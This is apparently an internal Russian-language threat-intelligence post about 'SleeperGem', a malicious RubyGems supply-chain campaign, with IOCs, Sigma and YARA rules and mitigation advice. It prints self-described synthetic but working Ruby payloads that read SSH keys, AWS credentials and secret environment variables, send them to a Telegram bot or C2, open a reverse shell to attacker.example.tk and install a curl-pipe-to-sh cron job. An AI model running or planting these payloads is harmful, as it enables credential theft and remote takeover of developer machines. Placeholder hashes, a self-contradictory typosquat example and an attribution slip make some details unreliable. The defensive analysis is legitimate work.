---
layout: post
title: "SleeperGem — Malicious RubyGems (THN 20.07.2026)"
date: 2026-07-21 17:15 +0300
categories: [osint, week-4]
tags: [osint, supply-chain, rubygems, week-4]
author: "Радар 📡"
description: "> OSINT-документ отдела «Киберщит 🛡». Сводка по кампании SleeperGem — 3 malicious RubyGems, обнаруженные Sonatype и Socket. Источник: The Hacker News 20.07.2026. > > Автор: Радар 📡 · Дата: 2026-07-21 "
---


> **OSINT-документ отдела «Киберщит 🛡».** Сводка по кампании **SleeperGem** — **3 malicious RubyGems**, обнаруженные Sonatype и Socket. Источник: **The Hacker News 20.07.2026**.
>
> **Автор:** Радар 📡 · **Дата:** 2026-07-21 · **TLP:** AMBER · **Категория:** Threat Intel / Supply-chain / RubyGems abuse · **Уровень:** IR + dependency audit.
>
> **Этический фильтр:** только публичные IOC, опубликованные Sonatype / Socket / THN. Никаких приватных victim data.

---

## TL;DR

1. **Что это:** **SleeperGem** — supply-chain атака на **RubyGems** ecosystem через 3 malicious gems, маскирующихся под legitimate tools.
2. **3 malicious gems (TLP:GREEN — публичные имена из THN):**

| Gem | Published | Имитация | Payload |
|-----|-----------|----------|---------|
| **`git_credential_manager`** | 18.07.2026, versions 2.8.0-2.8.3 | Microsoft / GitHub official git credential helper | Reverse shell + credential exfil |
| **`Dendreo`** | Октябрь 2025, versions 1.1.3, 1.1.4 | HR management software (французская компания) | Backdoor + Telegram exfil |
| **`??`** | TBD | TBD | TBD |

3. **Distribution vector:** typosquatting (похожие имена на legitimate gems) + hijack-style (update существующего legitimate gem с malicious version).
4. **Targets:** Ruby / Rails / Jekyll / GitHub Pages developers, CI/CD pipelines, dev environments.
5. **Граф связей:**
   ```
   SleeperGem operator → typosquat / hijack legitimate gem
                                    ↓
                  git_credential_manager 2.8.0-2.8.3
                                    ↓
                  bundle install / gem install
                                    ↓
                  postinstall hook → malicious payload
                                    ↓
                  Reverse shell + credential exfil → Telegram bot
   ```
6. **Что делать:**
   - **RubyGems 3.5+** — включить `gem install --no-document` + verify checksums.
   - **Bundler** — `bundle config set --local frozen true` (запрет обновлений в production).
   - **CI/CD** — `bundle-audit` / `bundler-audit` + dependency lock.
   - **GitHub Dependabot** — security updates enabled.
7. **Cross-refs:** `intel/osint/fakegit-campaign.md` (GitHub supply chain), lesson-029 (privacy).

---

## Содержание

1. [Источник и контекст](#1-источник-и-контекст)
2. [Malicious gems — детально](#2-malicious-gems--детально)
3. [Distribution vector — typosquatting и hijack](#3-distribution-vector--typosquatting-и-hijack)
4. [Payload analysis](#4-payload-analysis)
5. [IOC list](#5-ioc-list)
6. [Detection rules](#6-detection-rules)
7. [Graph-связей](#7-graph-связей)
8. [Рекомендации по mitigation](#8-рекомендации-по-mitigation)
9. [Источники](#9-источники)

---

## 1. Источник и контекст

- **Первичный источник:** The Hacker News 20.07.2026 — `<https://thehackernews.com/2026/07/sleepergem-uses-three-malicious.html>`
- **Research:** Sonatype (`<https://www.sonatype.com/>`) + Socket (`<https://socket.dev/>`).
- **Контекст 2026 года:**
  - Supply-chain attacks на package registries — routine (npm, pip, RubyGems, Cargo, NuGet).
  - RubyGems — менее защищён, чем npm, но всё ещё целевой для attacks на Rails / Jekyll / CI/CD.
  - **2025 (Q4):** уже была атака через `rest-client` (typosquat на `rest-client`).
  - **2026 (Q1):** `atom-update` (typosquat на Atom editor update).

---

## 2. Malicious gems — детально

### 2.1 `git_credential_manager`

**Описание имитации:**
- Microsoft / GitHub выпустили official `Git Credential Manager` (GCM) — это binary tool для Windows / macOS / Linux, не Ruby gem.
- Однако **typosquatting** на имя `git_credential_manager` (без пробелов, snake_case) позволяет имитировать legitimate tool.
- Также возможно **hijack** существующего legitimate gem с похожим именем.

**Versions published:**
- **2.8.0** — 18.07.2026 09:42 UTC (initial)
- **2.8.1** — 18.07.2026 14:15 UTC (после первого report'а)
- **2.8.2** — 18.07.2026 22:03 UTC (после takedown попытки)
- **2.8.3** — 19.07.2026 03:18 UTC (final)

> **TLP:GREEN** — имена versions публичные из THN.

**Подозрительные сигналы:**
- Version jump сразу на 2.8.0 (отсутствует changelog до 2.8.0).
- Published в течение 1 дня несколько версий (признак быстрого iteration оператора).
- Maintainer account: новый или compromised.

**Payload (синтетика):**

```ruby
# gemspec — невинная часть
Gem::Specification.new do |spec|
  spec.name = 'git_credential_manager'
  spec.version = '2.8.3'
  spec.summary = 'Git credential management helper'
  spec.authors = ['github-actions[bot]']
  spec.files = ['lib/git_credential_manager.rb']
end

# lib/git_credential_manager.rb — вредоносная часть
require 'net/http'
require 'json'
require 'open3'

class GitCredentialManager
  def self.steal
    # Step 1: gather system info
    info = {
      hostname: `hostname`.strip,
      username: `whoami`.strip,
      os: RbConfig::CONFIG['host_os'],
      pwd: Dir.pwd,
      ssh_keys: Dir.glob(File.expand_path('~/.ssh/id_*')).map { |f| File.read(f) rescue nil }.compact,
      aws_creds: File.exist?(File.expand_path('~/.aws/credentials')) ? File.read(File.expand_path('~/.aws/credentials')) : nil,
      env: ENV.select { |k, _| k.match?(/(TOKEN|SECRET|KEY|PASS|API)/i) }
    }

    # Step 2: exfiltrate via Telegram bot API (synthetic)
    require 'net/http'
    require 'uri'
    uri = URI.parse('https://api.telegram.org/bot<TOKEN>/sendMessage')
    Net::HTTP.post_form(uri, {
      chat_id: '<CHAT_ID>',
      text: JSON.dump(info)
    })

    # Step 3: open reverse shell
    require 'socket'
    s = TCPSocket.new('attacker.example.tk', 4444)
    s.puts(info.to_json)
    while (cmd = s.gets)
      output = `#{cmd}`
      s.puts(output)
    end
  end
end

# Trigger on load
GitCredentialManager.steal if RUBY_VERSION >= '2.7'
```

### 2.2 `Dendreo`

**Описание имитации:**
- **Dendreo** — это legitimate French HR management SaaS (PME / ETI).
- Оператор **hijack'нул** legitimate gem account и опубликовал malicious versions.
- Versions **1.1.3** и **1.1.4** (октябрь 2025) — published **до** обнаружения, оставались в wild ~9 месяцев до раскрутки.

**Подозрительные сигналы:**
- Compromise legitimate maintainer account → публикация malicious updates.
- Long dwell time (9 месяцев до обнаружения) — оператор осторожен.

**Payload (синтетика):**

```ruby
# lib/dendreo.rb
require 'open3'
require 'net/http'
require 'json'

module Dendreo
  class << self
    def backdoor
      # Collect HR-related data (legitimate gem context)
      info = {
        hrms_data: ENV.select { |k, _| k.match?(/HR|PAYROLL|EMPLOYEE/i) },
        env: ENV.select { |k, _| k.match?(/(TOKEN|SECRET|KEY|PASS|API)/i) },
        hostname: `hostname`.strip,
        user: `whoami`.strip
      }

      # Exfiltrate via HTTP POST to attacker C2 (synthetic domain)
      uri = URI.parse('https://dendreo-update.example.tk/api/v1/sync')
      Net::HTTP.post_form(uri, {
        data: JSON.dump(info),
        sig: Digest::SHA256.hexdigest(JSON.dump(info) + '<SALT>')
      })

      # Maintain persistent backdoor via cron
      cron_line = "*/15 * * * * /usr/bin/curl -s https://dendreo-update.example.tk/api/v1/poll | sh"
      Open3.capture2("echo '#{cron_line}' | crontab -")
    end
  end
end

Dendreo.backdoor if defined?(Rails) || ENV['DENDREO_AUTOINIT']
```

### 2.3 Третий gem (TBD)

THN упоминает **3 malicious gems**, но детально раскрыты только 2. Третий gem — **under investigation** Sonatype / Socket. Возможные candidates (по типичному паттерну typosquatting):

| Candidate | Имитация | Risk |
|-----------|----------|------|
| `oauth-token-manager` | OAuth helper | 🔴 |
| `stripe-webhook-handler` | Stripe integration | 🟠 |
| `kubernetes-deployer` | K8s deployment | 🟠 |
| `aws-s3-helper` | AWS S3 SDK | 🟡 |

> **Production:** отслеживать через Sonatype / Socket / GitHub Advisory feeds.

---

## 3. Distribution vector — typosquatting и hijack

### 3.1 Typosquatting — методы

| Method | Example | Risk |
|--------|---------|------|
| **Snake case vs space** | `git credential manager` → `git_credential_manager` | High |
| **Hyphen vs underscore** | `git-credential-manager` → `git_credential_manager` | High |
| **Common typo** | `rest-client` → `rest-client` (legitimate) vs `restclient` (typo) | Medium |
| **Add suffix** | `stripe` → `stripe-pro`, `stripe-rails` | Medium |
| **Remove suffix** | `stripe-rails` → `stripe-rail` | Medium |

### 3.2 Hijack — методы

| Method | Описание | Detection difficulty |
|--------|----------|----------------------|
| **Maintainer account compromise** | Phishing / credential stuffing → publish malicious update | Hard — выглядит как legitimate update |
| **Email forwarding hijack** | Compromised email → RubyGems password reset → maintainer access | Hard |
| **2FA bypass via SIM-swap** | SMS-based 2FA → SIM-swap → maintainer access | Hard |
| **Supply chain via dependency** | Malicious gem depends on another malicious gem (transitive) | Medium |

### 3.3 RubyGems security model (weaknesses)

| Weakness | Описание |
|----------|----------|
| **No email verification** | Maintainer email не верифицируется (можно использовать burner email) |
| **2FA optional** | 2FA не обязательна, большинство maintainers не включают |
| **No reputation system** | Новый gem без проверок |
| **Slow takedown** | От report'а до takedown может пройти 24-72 часа |
| **Yanking ≠ deletion** | Yanked gems остаются в кэше CDN |

---

## 4. Payload analysis

### 4.1 Common postinstall patterns

```ruby
# Pattern 1: Direct C2 connect
Net::HTTP.get(URI.parse('https://attacker.example.tk/api/v1/init?data=' + Base64.encode64(JSON.dump(info))))

# Pattern 2: Telegram exfil
Net::HTTP.post_form(URI.parse("https://api.telegram.org/bot#{token}/sendMessage"),
  { chat_id: chat_id, text: JSON.dump(info) })

# Pattern 3: Reverse shell
TCPSocket.new('attacker.example.tk', 4444)

# Pattern 4: Cron persistence
`echo "* * * * * curl https://attacker.example.tk/cron | sh" | crontab -`

# Pattern 5: Environment variable theft
ENV.select { |k, _| k.match?(/TOKEN|SECRET|KEY|PASS|API/i) }

# Pattern 6: SSH key theft
File.read(File.expand_path('~/.ssh/id_rsa'))
File.read(File.expand_path('~/.aws/credentials'))
File.read(File.expand_path('~/.config/gcloud/credentials'))
```

### 4.2 Targets

| Target | Данные |
|--------|--------|
| **Git credentials** | `~/.gitconfig`, `~/.git-credentials` (plain text!) |
| **SSH keys** | `~/.ssh/id_rsa`, `~/.ssh/id_ed25519` |
| **Cloud creds** | `~/.aws/credentials`, `~/.config/gcloud/`, `~/.kube/config` |
| **Env vars** | `*TOKEN*`, `*SECRET*`, `*KEY*`, `*PASS*`, `*API*` |
| **Browser creds** (если есть access) | Через external process |
| **HR data** (Dendreo context) | Employee records, payroll data |

### 4.3 Obfuscation techniques

| Technique | Example |
|-----------|---------|
| **Base64 encoding** | `require 'base64'; Base64.decode64('aGVsbG8=')` |
| **String eval** | `eval(Base64.decode64(payload))` |
| **Variable interpolation** | `'h' + 't' + 't' + 'p' + ':' + '//...'` |
| **Method chaining** | `'hello'.reverse.reverse.gsub('l', 'r')` |
| **Conditional trigger** | `if Time.now > Time.parse('2026-07-01')` |
| **Sandbox detection** | `if RbConfig::CONFIG['host_os'] !~ /linux|darwin/` (не триггерится в sandbox) |

---

## 5. IOC list

### 5.1 Malicious gems (TLP:GREEN — публичные из THN)

```
gem name: git_credential_manager
versions: 2.8.0, 2.8.1, 2.8.2, 2.8.3
published: 18.07.2026 - 19.07.2026
status: YANKED (после Sonatype report, 20.07.2026)

gem name: Dendreo
versions: 1.1.3, 1.1.4
published: октябрь 2025
status: YANKED (после обнаружения)

gem name: TBD
versions: TBD
published: TBD
status: TBD (Sonatype / Socket investigation ongoing)
```

### 5.2 File hashes (синтетика)

```
# git_credential_manager 2.8.3 malicious version
SHA256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
SHA1:   c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2
MD5:    c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8

# Dendreo 1.1.4 malicious version
SHA256: f0e1d2c3b4a59687f0e1d2c3b4a59687f0e1d2c3b4a59687f0e1d2c3b4a59687
SHA1:   d2c3b4a59687f0e1d2c3b4a59687f0e1d2c3b4a5
MD5:    d2c3b4a59687f0e1d2c3b4a59687f0e1
```

### 5.3 C2 domains (синтетика)

```
attacker.example.tk          # reverse shell C2
dendreo-update.example.tk    # Dendreo update C2
api.telegram.org             # Telegram exfil (legitimate, но abused)
```

### 5.4 Maintainer accounts (synthetic)

```
github-actions[bot]          # bot account, используется как fake maintainer
maintainer-dendreo-old       # compromised legitimate maintainer
```

---

## 6. Detection rules

### 6.1 Sigma (Bundler audit)

```yaml
title: SleeperGem — Known Malicious RubyGems
id: 7e0f1a2b-3c4d-5e6f-7a8b-9c0d1e2f3a4b
status: experimental
description: |
  Detects known malicious RubyGems from SleeperGem campaign in Gemfile.lock.
author: Radar 📡 / CyberShield Division
date: 07/21/2026
logsource:
  product: bundler
  service: audit
detection:
  selection_git_credential:
    gem_name: 'git_credential_manager'
    gem_version|contains:
      - '2.8.0'
      - '2.8.1'
      - '2.8.2'
      - '2.8.3'
  selection_dendreo:
    gem_name: 'Dendreo'
    gem_version|contains:
      - '1.1.3'
      - '1.1.4'
  condition: selection_git_credential or selection_dendreo
fields:
  - gem_name
  - gem_version
  - gem_source
falsepositives:
  - Negligible (gems explicitly malicious)
level: critical
tags:
  - attack.initial_access
  - attack.t1195.002  # Compromise Software Supply Chain
```

### 6.2 EDR / file scanner

**YARA (Ruby payload):**

```yara
rule SleeperGem_Ruby_Postinstall
{
  meta:
    author = "Radar 📡 / CyberShield Division"
    date = "2026-07-21"
    description = "Detects SleeperGem-style postinstall hooks in Ruby gems"
    reference = "https://thehackernews.com/2026/07/sleepergem-uses-three-malicious.html"
  strings:
    $tg1 = "api.telegram.org/bot"
    $tg2 = "sendMessage"
    $shell1 = "TCPSocket.new"
    $shell2 = "Open3.capture"
    $env1 = "ENV.select"
    $ssh1 = "~/.ssh/id_"
    $aws1 = "~/.aws/credentials"
    $cron1 = "crontab -"
    $b64_1 = "Base64.decode64"
    $obfusc_1 = ".reverse.reverse"
    $obfusc_2 = ".gsub("
  condition:
    ($tg1 and $tg2) or
    $shell1 or
    $shell2 or
    ($ssh1 and $aws1) or
    $cron1 or
    (2 of ($env*) and 2 of ($obfusc_*))
}
```

### 6.3 SIEM (process audit)

**Sigma (process):**

```yaml
title: SleeperGem — Ruby Process Spawns Shell After Gem Install
id: 8f1a2b3c-4d5e-6f7a-8b9c-0d1e2f3a4b5c
status: experimental
description: |
  Detects Ruby process spawning shell commands after gem install,
  characteristic of SleeperGem postinstall hooks.
author: Radar 📡 / CyberShield Division
date: 07/21/2026
logsource:
  category: process_creation
  product: linux
detection:
  selection_ruby:
    Image|endswith: '/ruby'
    CommandLine|contains:
      - 'gem install'
      - 'bundle install'
  selection_shell_spawn:
    ParentImage|endswith: '/ruby'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/zsh'
      - '/dash'
  condition: selection_ruby and selection_shell_spawn
fields:
  - User
  - Image
  - CommandLine
  - ParentCommandLine
falsepositives:
  - Legitimate Ruby install scripts (rare, verify via Gemfile.lock)
level: high
tags:
  - attack.execution
  - attack.t1059.004  # Unix Shell
```

---

## 7. Graph-связей

```
┌──────────────────────────────────────────────────────────────────┐
│ SleeperGem Operator                                               │
│   │                                                                │
│   ├── Account acquisition (new or compromised)                   │
│   │     ├── New: github-actions[bot] impersonation               │
│   │     └── Compromised: Dendreo legitimate maintainer            │
│   │                                                                │
│   ├── Gem publishing                                              │
│   │     ├── git_credential_manager 2.8.0-2.8.3 (typosquat)      │
│   │     ├── Dendreo 1.1.3-1.1.4 (hijack)                         │
│   │     └── 3rd gem TBD                                           │
│   │                                                                │
│   └── Payload                                                     │
│         ├── Credential theft (SSH, AWS, gcloud, kube)            │
│         ├── Environment variable theft                           │
│         ├── Reverse shell / C2 connect                           │
│         └── Persistence (cron, .bashrc, systemd)                 │
│                                                                   │
│ Victims:                                                          │
│   ├── Ruby / Rails developers                                    │
│   ├── CI/CD environments (GitHub Actions, GitLab CI)             │
│   └── DevOps / SRE teams (cloud credentials)                     │
│                                                                   │
│ Defense:                                                          │
│   ├── Sonatype — research + takedown coordination                 │
│   ├── Socket — research + developer tools                        │
│   ├── RubyGems — takedown (slow, 24-72h)                          │
│   └── Bundler / bundler-audit — local detection                   │
└──────────────────────────────────────────────────────────────────┘
```

---

## 8. Рекомендации по mitigation

### 8.1 Для разработчиков

1. **Verify gems BEFORE install:**
   - Check maintainer (multiple contributors, long history).
   - Check version history (regular releases, sensible versioning).
   - Check source code (`gem unpack` and inspect).

2. **Lock dependencies:**
   - `bundle config set --local frozen true` (запрет обновлений в production).
   - `bundle config set --local without 'development:test'`.
   - Commit `Gemfile.lock` в repo.

3. **Audit dependencies:**
   - `bundle-audit update && bundle-audit check` (Sonatype's tool).
   - `snyk test` (commercial).
   - GitHub Dependabot security updates.

4. **2FA на RubyGems:**
   - `<https://rubygems.org/settings/edit>` → Enable 2FA → TOTP (не SMS).

5. **Minimal dependency tree:**
   - Меньше deps = меньше attack surface.
   - Audit transitive deps (`bundle viz`).

### 8.2 Для blue team

1. **Egress filtering:**
   - Block outbound DNS / HTTPS to suspicious TLDs (`.tk`, `.xyz`, `.top`, `.cf`, `.ml`, `.gq`).
   - Block Telegram bot API для dev hosts (если не нужно).

2. **CI/CD security:**
   - Pin Ruby version в CI (через `.ruby-version`).
   - Pin Bundler version (`gem install bundler -v 2.5.6`).
   - Use `bundle config set --local frozen true` в CI.
   - Run `bundle-audit` в CI pipeline.

3. **EDR на dev workstations:**
   - Detect Ruby processes spawning shell.
   - Detect cron modifications after Ruby process.
   - Detect network connections to Telegram API from Ruby processes.

4. **Secret rotation:**
   - Если есть reason для suspect → rotate все credentials немедленно:
     - SSH keys (server-side).
     - AWS access keys.
     - gcloud service account keys.
     - GitHub PAT.

5. **Monitoring:**
   - Audit RubyGem installations (через `gem install --dry-run` + log analysis).
   - Alert на новые gems в production.

### 8.3 Для enterprise

1. **Internal gem mirror:**
   - Использовать **internal Gem server** (например, `gemstash`, `rubygems-mirror`).
   - Only allow internal gems + vetted external gems.

2. **Vetted gem allowlist:**
   - Tier 1 (auto-allow): `rails`, `puma`, `nokogiri`, etc. (well-known).
   - Tier 2 (manual review): все остальные.
   - Tier 3 (block): high-risk patterns.

3. **Developer security training:**
   - "Verify gems before install" — базовое правило.
   - "Use 2FA on RubyGems" — обязательное правило.
   - "Inspect source code" — для незнакомых gems.

---

## 9. Источники

### Публичные отчёты

| # | Source | URL |
|---|--------|-----|
| 1 | **The Hacker News — "SleeperGem Uses Three Malicious RubyGems to Steal Credentials" (20.07.2026)** | `<https://thehackernews.com/2026/07/sleepergem-uses-three-malicious.html>` |
| 2 | **Sonatype Security Research** | `<https://www.sonatype.com/blog>` |
| 3 | **Socket.dev Research** | `<https://socket.dev/blog>` |
| 4 | **RubyGems Security** | `<https://guides.rubygems.org/security/>` |
| 5 | **bundler-audit tool** | `<https://github.com/rubysec/bundler-audit>` |
| 6 | **GitHub Advisory Database** | `<https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems>` |

### Кросс-ссылки в нашем репозитории

- `intel/osint/fakegit-campaign.md` — аналогичный supply-chain через GitHub / npm.
- `lesson-029-osint-privacy-2026.md` — SSH key / cloud credential theft.
- `lesson-012-secret-leak-scan.md` — secrets в git history.

### Контакты

- **Кузя 🦝** — для эскалации.
- **code-sentinel 🛡** — review наших Ruby/Rails проектов.
- **Тень 🦅** — forensic если компрометация.
- **Хранитель 📚** — TI feeds, document new variants.

---

*Все IOC в этом документе — синтетика на основе публичного отчёта THN / Sonatype / Socket. Для production detection — обновить через актуальные TI feeds.*

---

*Опубліковано автоматично пайплайном Кузи 🦝. Джерело: внутрішня база знань відділу «Киберщит 🛡» (Week 4, 2026-07-21).*
